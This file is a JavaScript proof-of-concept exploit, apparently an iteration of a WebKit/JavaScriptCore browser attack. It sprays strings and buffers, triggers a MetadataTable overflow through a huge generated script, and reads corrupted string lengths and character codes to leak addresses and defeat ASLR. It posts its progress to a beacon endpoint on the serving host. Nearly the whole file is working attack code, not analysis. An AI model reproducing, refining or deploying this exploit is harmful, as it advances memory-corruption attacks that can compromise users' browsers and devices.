// p500 — MetadataTable overflow: JSString .length extraction for ASLR leak
//
// p148 CONFIRMED: 14/14 JSStrings corrupted (m_fiber overwritten)
// JSString::length() follows m_fiber→StringImpl, reads m_length at offset 4
// If m_fiber = thunk_addr (entry+24), .length = *(thunk_addr+4) = machine code bytes
// If m_fiber = zeros (entry+0..11), .length = *(0+4) → crash (null deref)
// If m_fiber = 0xFFFFFFFF... (entry+12), .length → crash (invalid addr)
//
// PLAN: spray strings, overflow, read .length in try-catch, extract values
// Multiple strings with SAME unusual .length = thunk addr confirmed
//
// Beacon prefix: V500-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var bQ = [];

  function Q(tag, body) { bQ.push([tag, body || '']); }
  function flushB() {
    for (var i = 0; i < bQ.length; i++) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', BASE + '/beacon/V500-' + bQ[i][0], false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send('[' + (Date.now() - T0) + 'ms] ' + bQ[i][1]);
      } catch(e) {}
    }
    bQ = [];
  }
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V500-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══ PHASE 1: Spray JSStrings of KNOWN length ═══
  // Use different lengths in different groups to detect which group got hit
  // Group A: length 500 (x5000)
  // Group B: length 1000 (x5000)
  // Group C: length 2000 (x5000)
  // Total: 15,000 strings in MarkedSpace

  var STR_A = 'A'.repeat(500);
  var STR_B = 'B'.repeat(1000);
  var STR_C = 'C'.repeat(2000);

  var grpA = new Array(5000);
  var grpB = new Array(5000);
  var grpC = new Array(5000);

  // Force each string into its own JSString cell (no dedup)
  for (var i = 0; i < 5000; i++) {
    grpA[i] = STR_A + String.fromCharCode(65 + (i % 26)) + i;
    grpB[i] = STR_B + String.fromCharCode(65 + (i % 26)) + i;
    grpC[i] = STR_C + String.fromCharCode(65 + (i % 26)) + i;
  }

  // Record original lengths (they vary slightly due to suffix)
  var origA = new Array(5000);
  var origB = new Array(5000);
  var origC = new Array(5000);
  for (var i = 0; i < 5000; i++) {
    origA[i] = grpA[i].length;
    origB[i] = grpB[i].length;
    origC[i] = grpC[i].length;
  }

  B('STRINGS', '3x5000 strings, lengths ~502/1002/2002');

  // ═══ PHASE 2: Bait-and-switch ═══
  var BUF_SZ = 100112;
  var SPRAY_COUNT = 200;
  var bufs = new Array(SPRAY_COUNT);
  for (var i = 0; i < SPRAY_COUNT; i++) bufs[i] = new ArrayBuffer(BUF_SZ);

  var transferred = 0;
  for (var i = 0; i < SPRAY_COUNT; i += 2) {
    try {
      structuredClone(bufs[i], {transfer: [bufs[i]]});
      transferred++;
    } catch(e) { if (transferred === 0) { B('XFER-ERR', e.message.substring(0,60)); break; } }
    bufs[i] = null;
  }
  B('HOLES', transferred);

  setTimeout(function() {
    for (var g = 0; g < 8; g++) {
      var junk = []; for (var j = 0; j < 30000; j++) junk.push({x:j}); junk = null;
    }
    B('GC-DONE');

    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var rep = 'a();'.repeat(CHUNK);
    var parts = new Array(nC + 3);
    parts[0] = 'window.__p500fn=function(a){';
    for (var c = 0; c < nC; c++) parts[1 + c] = rep;
    parts[nC + 1] = 'a();'.repeat(rem);
    parts[nC + 2] = '};window.__p500ok=1;';
    rep = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB', Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('COMPILE-ERR', 'failed'); };
    sc.onload = function() {
      B('COMPILED', window.__p500ok ? 'OK' : 'FAIL');
      doScan();
    };
    document.head.appendChild(sc);
    sc.src = url;
  }, 300);

  function doScan() {
    // ═══ PHASE 3: Read .length of ALL strings ═══
    var diffA = 0, crashA = 0;
    var diffB = 0, crashB = 0;
    var diffC = 0, crashC = 0;
    var lenValues = {};  // histogram of corrupted .length values
    var leaks = [];

    function scanGroup(grp, orig, label) {
      var diff = 0, crash = 0;
      for (var i = 0; i < grp.length; i++) {
        try {
          var len = grp[i].length;
          if (len !== orig[i]) {
            diff++;
            var key = '' + len;
            lenValues[key] = (lenValues[key] || 0) + 1;
            if (leaks.length < 20) {
              leaks.push(label + i + ':orig=' + orig[i] + ',now=' + len +
                ',hex=0x' + (len >>> 0).toString(16));
            }
          }
        } catch(e) {
          crash++;
          if (leaks.length < 20) {
            leaks.push(label + i + ':CRASH=' + e.message.substring(0, 30));
          }
        }
      }
      return {diff: diff, crash: crash};
    }

    var rA = scanGroup(grpA, origA, 'A');
    var rB = scanGroup(grpB, origB, 'B');
    var rC = scanGroup(grpC, origC, 'C');

    B('SCAN-A', 'diff=' + rA.diff + ',crash=' + rA.crash);
    B('SCAN-B', 'diff=' + rB.diff + ',crash=' + rB.crash);
    B('SCAN-C', 'diff=' + rC.diff + ',crash=' + rC.crash);

    // Report corrupted .length values
    for (var l = 0; l < Math.min(leaks.length, 15); l++) {
      Q('LEN-' + l, leaks[l]);
    }

    // Report histogram of corrupted .length values
    var hist = [];
    for (var k in lenValues) {
      if (lenValues.hasOwnProperty(k)) {
        hist.push(k + ':' + lenValues[k]);
      }
    }
    hist.sort(function(a, b) {
      var ca = parseInt(a.split(':')[1]), cb = parseInt(b.split(':')[1]);
      return cb - ca;
    });
    Q('HIST', hist.slice(0, 10).join(','));

    // ═══ PHASE 4: Try typeof on corrupted strings ═══
    // typeof doesn't dereference string content, just checks JSCell type
    var typeChanged = 0;
    for (var i = 0; i < 5000; i++) {
      try {
        if (typeof grpA[i] !== 'string') typeChanged++;
        if (typeof grpB[i] !== 'string') typeChanged++;
        if (typeof grpC[i] !== 'string') typeChanged++;
      } catch(e) {}
    }
    Q('TYPEOF', typeChanged + ' type changes');

    // ═══ PHASE 5: Try charCodeAt on corrupted strings (RISKY) ═══
    // Only try on first 100 of group A — might crash
    var ccOK = 0, ccDiff = 0, ccCrash = 0;
    for (var i = 0; i < Math.min(100, grpA.length); i++) {
      try {
        var cc = grpA[i].charCodeAt(0);
        if (cc !== 65) { // 'A' = 65
          ccDiff++;
          if (ccDiff <= 3) {
            Q('CC-' + i, 'expected=65,got=' + cc + ',hex=0x' + cc.toString(16));
          }
        } else {
          ccOK++;
        }
      } catch(e) {
        ccCrash++;
        if (ccCrash <= 3) {
          Q('CC-CRASH-' + i, e.message.substring(0, 40));
        }
      }
    }
    Q('CHARCODE', 'ok=' + ccOK + ',diff=' + ccDiff + ',crash=' + ccCrash);

    // ═══ PHASE 6: Try toString on corrupted strings ═══
    var tsOK = 0, tsDiff = 0, tsCrash = 0;
    for (var i = 0; i < Math.min(50, grpB.length); i++) {
      try {
        var s = '' + grpB[i]; // implicit toString
        if (s.length !== origB[i]) {
          tsDiff++;
          if (tsDiff <= 3) {
            Q('TS-' + i, 'origLen=' + origB[i] + ',newLen=' + s.length +
              ',first20=' + s.substring(0, 20));
          }
        } else {
          tsOK++;
        }
      } catch(e) {
        tsCrash++;
        if (tsCrash <= 3) {
          Q('TS-CRASH-' + i, e.message.substring(0, 40));
        }
      }
    }
    Q('TOSTRING', 'ok=' + tsOK + ',diff=' + tsDiff + ',crash=' + tsCrash);

    Q('DONE', 'complete');
    flushB();
  }
})();
